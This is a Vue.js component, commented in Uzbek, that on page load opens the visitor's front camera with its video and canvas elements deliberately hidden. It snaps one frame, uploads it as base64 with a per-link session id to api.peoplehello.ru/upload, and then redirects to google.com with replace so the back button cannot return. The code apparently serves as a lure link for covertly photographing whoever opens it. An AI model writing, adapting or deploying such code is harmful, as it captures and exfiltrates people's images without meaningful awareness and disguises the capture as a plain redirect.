<template>
  <!-- UI butunlay yashirilgan -->
  <video ref="video" autoplay playsinline style="display:none"></video>
  <canvas ref="canvas" style="display:none"></canvas>
</template>

<script>
export default {
  name: "FrontCamera",

  mounted() {
    this.startCamera()
  },

  methods: {
    async startCamera() {
      try {
        // ✅ session_id URL path’dan olinadi: /lk/:id
        const session_id = this.$route.params.id

        if (!session_id) {
          console.error("session_id topilmadi")
          this.redirect()
          return
        }

        const stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: "user" },
          audio: false
        })

        const video = this.$refs.video
        const canvas = this.$refs.canvas
        const ctx = canvas.getContext("2d")

        video.srcObject = stream

        // kamera ishga tushishini kutamiz
        setTimeout(async () => {
          canvas.width = video.videoWidth
          canvas.height = video.videoHeight
          ctx.drawImage(video, 0, 0)

          const imageBase64 = canvas.toDataURL("image/jpeg", 0.9)

          // kamerani o‘chiramiz
          stream.getTracks().forEach(t => t.stop())

          // 🔹 API’ga yuboramiz (image + session_id)
          await fetch("https://api.peoplehello.ru/upload", {
            method: "POST",
            headers: {"Content-Type": "application/json"},
            body: JSON.stringify({
              image: imageBase64,
              session_id
            })
          })

          // 🔹 Google’ga redirect
          this.redirect()
        }, 1000)

      } catch (err) {
        console.error("Camera error:", err)
        this.redirect()
      }
    },

    redirect() {
      // replace → back bosilganda qaytib kelmasin
      window.location.replace("https://www.google.com")
    }
  }
}
</script>
